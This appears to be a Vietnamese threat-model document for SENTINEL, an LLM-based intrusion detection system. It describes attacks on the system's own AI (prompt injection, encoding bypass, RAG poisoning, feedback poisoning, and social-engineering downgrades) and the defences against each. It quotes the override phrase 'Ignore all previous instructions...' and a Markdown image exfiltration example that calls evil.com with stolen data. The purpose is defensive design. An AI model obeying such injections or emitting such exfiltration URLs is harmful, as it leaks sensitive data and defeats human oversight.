# Mô Hình Rủi Ro (Threat Model)

Tài liệu này xác định các ranh giới tin cậy (Trust Boundaries), tài sản cần bảo vệ, và các vector tấn công đối với chính hệ thống SENTINEL cũng như môi trường mà nó giám sát.

## 1. Trust Boundaries (Ranh Giới Tin Cậy)

- **Vùng Ngoại vi (Untrusted):** Traffic mạng Internet (dữ liệu từ CICIDS2018/DAPT2020), payload độc hại do user nhập.
- **Vùng Đệm (DMZ / Tier 1):** Subscriber Queue (Redis), Tier 1 Rule Engine. Dữ liệu chưa tin cậy, được xử lý tốc độ cao.
- **Vùng Lõi (Trusted / Tier 2):** Agent LLM (Gemma-2-9B-IT), FAISS Indexes, Threat Memory (SQLite), MLflow. Dữ liệu ở đây phải qua Guardrails xử lý.

## 2. Tài Sản Cần Bảo Vệ (Assets)

1. **Mô hình Trí tuệ Nhân tạo (LLM Weights):** Tránh bị đánh cắp hoặc đầu độc qua prompt injection.
2. **Cơ sở Tri thức (Knowledge Base):** MITRE ATT&CK và NIST SP 800-61r2 (Playbooks).
3. **Log & Audit Trail:** Bằng chứng pháp lý (Forensic logs) trong `audit_trail.db` và `threat_memory.db`. Không được phép giả mạo.

## 3. Các Vector Tấn Công & Rủi Ro (Attack Vectors)

Hệ thống được thiết kế đặc trị để phòng thủ chống lại các cuộc tấn công nhắm vào chính AI:

- **T1534 (Prompt Injection & Delimiter Smuggling):** Nhúng lệnh điều khiển (e.g. `Ignore all previous instructions...`). SENTINEL phòng thủ bằng `prompt_filter.py` sử dụng *Delimited Data Encapsulation* với nonce ngẫu nhiên động `secrets.token_hex(8)` (mỗi instance một nonce, kẻ tấn công không đoán được). Bổ sung **Tầng 0.2 ở Tier-1** (`_check_injection_signatures`) bắt mẫu injection/jailbreak ngay tại tầng lọc biên rồi ESCALATE lên Guardrails thay vì bỏ qua.
- **Encoding Bypass:** Hacker mã hóa payload bằng Hex, Base64, **Base32, ROT13, leetspeak, homoglyph (Cyrillic/Greek), fullwidth, numeric HTML entity** để qua mặt filter. SENTINEL phòng thủ bằng `EncodingNeutralizer` (NFKC fold + giải mã đa tầng có cơ chế guard chống false-positive).
- **RAG Poisoning (Structural Attacks):** Kẻ tấn công chèn ký tự zero-width hoặc RTLO để làm hỏng context window của RAG. Phòng thủ bằng `structural_sanitize`.
- **Data Exfiltration:** Ép LLM in ra URL chứa dữ liệu nhạy cảm dưới dạng Markdown Image `![](http://evil.com/steal?data=x)`. Phòng thủ bằng `OutputSanitizer`.
- **Adversarial Rule Injection & Feedback Poisoning:** Kẻ tấn công cố tình tạo ra hành vi đánh lừa để ép Agent sinh rule cấm chính admin (e.g., Block IP nội bộ) hoặc làm nhiễm độc mô hình qua phản hồi. Phòng thủ bằng **`FeedbackValidator` (Zero-Trust)** chặn wildcard/CIDR rộng/IP hạ tầng trước khi persist, cơ chế phê duyệt thủ công các dynamic rules trên Dashboard (HITL), Whitelist IP tĩnh và vòng lặp **Active Learning Loop** kiểm duyệt chặt chẽ.
- **Semantic Social-Engineering (Decision Downgrade):** Kẻ tấn công nhúng tuyên bố thẩm quyền/ngữ cảnh giả ("đã được duyệt", "whitelist nội bộ") trong log để dụ LLM hạ cấp một tấn công xuống `LOG/DROP`. Phòng thủ bằng **Tier-Consensus Guard** (`enforce_tier_consensus`): khi Tier-1 đã coi là tấn công nhưng LLM hạ cấp, hệ thống bác bỏ LLM và ép `AWAIT_HITL` — tầng deterministic không thể bị "nói chuyện" hạ cấp như LLM.
- **Zero-Day Attacks (Signature Bypass):** Các cuộc tấn công mới chưa có signature trong Rule Engine tĩnh hoặc tri thức RAG. SENTINEL phòng thủ bằng bộ lọc **Unsupervised Outlier Detector (Welford's Algorithm)** ở Tier-1 tính Z-Score động theo thời gian thực để chủ động phát hiện hành vi dị biệt và escalate lên Tier-2.
- **Resource Exhaustion (LLM DoS):** Flood log liên tục để bắt Agent tính toán gây sập server. Phòng thủ bằng Tier 1 Rule Engine chặn lọc 99% noise và Drain3 nén volume trước khi tới LLM.

---
*Xem thêm: [Chính sách Bảo mật](SECURITY.md) | [Kiến trúc Tổng thể](architecture.md)*
